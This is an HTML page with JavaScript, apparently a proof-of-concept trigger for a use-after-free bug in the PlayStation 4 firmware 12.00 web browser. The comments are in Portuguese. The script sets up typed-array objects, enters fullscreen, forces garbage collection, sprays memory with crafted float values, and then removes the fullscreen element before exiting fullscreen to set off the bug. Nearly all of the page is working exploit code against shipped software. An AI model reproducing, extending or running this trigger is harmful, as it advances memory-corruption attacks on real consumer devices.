<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Fullscreen UAF - Real Trigger</title>
</head>
<body>

<h2>PS4 12.00 - UAF (Real Trigger)</h2>

<button onclick="run()">Run Test</button>

<pre id="log" style="background:#111;color:#0f0;padding:10px;height:400px;overflow:auto;"></pre>

<script>
function log(msg) {
    document.getElementById("log").textContent += msg + "\n";
}

let f64, u32, dv;
let victimBuffer;
let fsTarget;

function run() {
    log("[*] Iniciando teste...");

    // =========================
    // Criar objetos
    // =========================
    victimBuffer = new ArrayBuffer(0x100);
    f64 = new Float64Array(victimBuffer);
    u32 = new Uint32Array(victimBuffer);
    dv  = new DataView(victimBuffer);

    f64[0] = 13.37;
    u32[2] = 0x1337;
    dv.setUint32(16, 0xdeadbeef, true);

    log("[+] Objetos criados");

    // =========================
    // Criar elemento fullscreen
    // =========================
    fsTarget = document.createElement("div");
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.background = "black";

    document.body.appendChild(fsTarget);

    fsTarget.webkitRequestFullscreen?.();
    log("[*] Fullscreen ativo");

    // =========================
    // Trigger crítico
    // =========================
    setTimeout(() => {

        log("[*] Preparando trigger crítico...");

        // GC leve
        for (let i = 0; i < 10000; i++) {
            new ArrayBuffer(0x2000);
        }

        log("[*] GC executado");

        // Spray leve
        let spray = [];
        for (let i = 0; i < 4000; i++) {
            let arr = new Float64Array(16);
            arr.fill(2.121995791e-314);
            spray.push(arr);
        }

        log("[*] Spray executado");

        // CHECK antes do crash
        try {
            log("---- CHECK PRÉ-TRIGGER ----");
            log("[F64] " + f64[0]);
            log("[U32] " + u32[2]);
            log("[DV] " + dv.getUint32(16, true));
        } catch (e) {
            log("[ERRO] " + e);
        }

        // 🔥 TRIGGER REAL (SEU BUG)
        log("[!!!] TRIGGER: remove + exitFullscreen");

        fsTarget.remove();

        document.webkitExitFullscreen?.();

    }, 500); // ← mantém seu timing crítico
}
</script>

</body>
</html>
